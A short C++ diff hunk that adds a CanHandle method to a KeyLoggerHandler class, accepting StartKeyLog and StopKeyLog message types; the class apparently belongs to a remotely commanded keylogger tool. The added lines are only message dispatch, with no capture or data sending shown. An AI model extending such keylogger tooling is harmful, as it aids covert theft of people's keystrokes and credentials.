@@ -5,6 +5,13 @@ KeyLoggerHandler::KeyLoggerHandler(std::shared_ptr<IMessageSender> sender) :
 {
 }
 
+bool KeyLoggerHandler::CanHandle(const MessageType type)
+{
+	return
+		type == MessageType::StartKeyLog ||
+		type == MessageType::StopKeyLog;
+}
+
 void KeyLoggerHandler::Handle(MessageType type, SharedSpan content)
 {
 	switch(type)
